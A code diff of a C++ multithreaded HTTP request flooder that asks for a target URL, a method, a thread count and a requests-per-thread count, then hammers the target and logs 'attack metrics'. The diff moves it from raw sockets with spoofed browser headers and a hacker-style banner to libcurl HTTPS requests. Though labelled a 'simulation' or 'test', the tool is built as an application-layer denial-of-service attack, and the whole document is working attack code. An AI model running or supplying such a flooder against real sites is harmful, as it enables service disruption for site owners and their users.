@@ -1,115 +1,77 @@
 #include <iostream>
 #include <fstream>
 #include <sstream>
-#include <thread>
 #include <vector>
+#include <thread>
 #include <chrono>
-#include <cstdlib>
-#include <cstring>
-#include <ctime>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <netdb.h>
+#include <curl/curl.h>
 
 using namespace std;
 using namespace chrono;
 
-#define RED     "\033[1;31m"
-#define GREEN   "\033[1;32m"
 #define CYAN    "\033[1;36m"
+#define GREEN   "\033[1;32m"
+#define RED     "\033[1;31m"
 #define RESET   "\033[0m"
 
-string generate_header() {
-    vector<string> headers = {
-        "User-Agent: Mozilla/5.0",
-        "Accept: */*",
-        "Cache-Control: no-cache",
-        "Accept-Encoding: gzip",
-        "Connection: close"
-    };
-    ostringstream h;
-    for (auto& s : headers) h << s << "\r\n";
-    return h.str();
-}
-
-string resolve_domain(const string& host) {
-    hostent* he = gethostbyname(host.c_str());
-    if (he && he->h_addr_list[0])
-        return inet_ntoa(*(struct in_addr*)he->h_addr_list[0]);
-    return host;
-}
-
-void attack(string ip, int port, string method, int id, int count, ofstream& log) {
+void https_attack(const string& url, const string& method, int id, int count, ofstream& log) {
+    CURL *curl;
+    CURLcode res;
     int success = 0;
-    double total_rtt = 0;
+    double total_time = 0;
 
+    curl_global_init(CURL_GLOBAL_ALL);
     for (int i = 0; i < count; i++) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        sockaddr_in server{};
-        server.sin_family = AF_INET;
-        server.sin_port = htons(port);
-        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);
+        curl = curl_easy_init();
+        if(curl) {
+            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method.c_str());
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
+            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
 
-        auto start = high_resolution_clock::now();
-        if (connect(sock, (sockaddr*)&server, sizeof(server)) >= 0) {
-            string req = method + " / HTTP/1.1\r\nHost: " + ip + "\r\n" + generate_header() + "\r\n";
-            send(sock, req.c_str(), req.size(), 0);
+            auto start = high_resolution_clock::now();
+            res = curl_easy_perform(curl);
+            auto end = high_resolution_clock::now();
 
-            char buffer[1024];
-            int r = recv(sock, buffer, sizeof(buffer)-1, 0);
-            if (r > 0) {
-                buffer[r] = 0;
-                string line(buffer);
-                size_t pos = line.find("\r\n");
-                line = (pos != string::npos) ? line.substr(0, pos) : line;
-                cout << GREEN << "[T" << id << "] Response: " << line << RESET << endl;
+            if(res == CURLE_OK) {
+                success++;
+                double rtt = duration_cast<milliseconds>(end - start).count();
+                total_time += rtt;
+                cout << GREEN << "[T" << id << "] HTTPS OK (" << rtt << "ms)" << RESET << endl;
+            } else {
+                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
             }
-            success++;
+            curl_easy_cleanup(curl);
         }
-        auto end = high_resolution_clock::now();
-        total_rtt += duration_cast<milliseconds>(end - start).count();
-        close(sock);
     }
+    curl_global_cleanup();
 
-    double avg_rtt = (count > 0) ? total_rtt / count : 0;
-    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_rtt << "ms\n";
-    cout << CYAN << "[Thread " << id << "] Completed. Success: " << success << ", Avg RTT: " << avg_rtt << "ms" << RESET << endl;
+    double avg_time = (count > 0) ? total_time / count : 0;
+    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";
 }
 
 int main() {
-    srand(time(0));
-    string target, method;
-    int port, threads, per_thread;
+    string url, method;
+    int threads, per_thread;
 
-    cout << CYAN << R"(
- __/\\\\\\\\\\\\\\_________/\\\\\\\\\\___________/\\\\\\\\\\\\\\_____/\\\\\\\\\\____        
-  _\\/\\\/////////\\\_____/\\\///////\\\_________\\/\\\//////////____/\\\///////\\\__       
-   _\\/\\\_______\\/\\\___\\/\\\_____\\/\\\________\\/\\\_____________\\/\\\_____\\/\\\__      
-    _\\/\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\_________\\/\\\\\\\\\\\\\\__\\/\\\\\\\\\\\/__     
-     _\\/\\\/////////_____\//\\\///////\\\__________\\/\\\///////____\\//\\\///////____    
-      _\\/\\\______________\\///\\\___///\\\__________\\/\\\_____________\\//\\\_________   
-       _\\/\\\______________\\////\\\\\\\\\\___________\\/\\\______________\\///\\\\\\\\\\\\\\_  
-        _\\///__________________\\///////_____________\\///_________________\\//////////__  
-    )" << RESET;
+    cout << CYAN << "[+] Target full URL (e.g. https://example.com): " << RESET;
+    cin >> url;
+    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET;
+    cin >> method;
+    cout << CYAN << "[+] Threads: " << RESET;
+    cin >> threads;
+    cout << CYAN << "[+] Requests per thread: " << RESET;
+    cin >> per_thread;
 
-    cout << CYAN << "[+] Target IP or Domain: " << RESET; cin >> target;
-    cout << CYAN << "[+] Port: " << RESET; cin >> port;
-    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET; cin >> method;
-    cout << CYAN << "[+] Threads: " << RESET; cin >> threads;
-    cout << CYAN << "[+] Requests per thread: " << RESET; cin >> per_thread;
-
-    string ip = resolve_domain(target);
-    cout << "\033[1;33m[*] Resolved IP: " << ip << "\033[0m" << endl;
-
-    ofstream log("attack_metrics.log");
-    vector<thread> pool;
-    for (int i = 0; i < threads; ++i)
-        pool.emplace_back(attack, ip, port, method, i + 1, per_thread, ref(log));
-
-    for (auto& t : pool) t.join();
+    ofstream log("https_attack_metrics.log");
+    vector<thread> workers;
+    for (int i = 0; i < threads; i++) {
+        workers.emplace_back(https_attack, url, method, i + 1, per_thread, ref(log));
+    }
+    for (auto& t : workers) t.join();
     log.close();
 
-    cout << GREEN << "[+] Attack simulation complete. Metrics saved to attack_metrics.log" << RESET << endl;
+    cout << GREEN << "[✔] HTTPS test complete. Log saved to https_attack_metrics.log" << RESET << endl;
     return 0;
 }
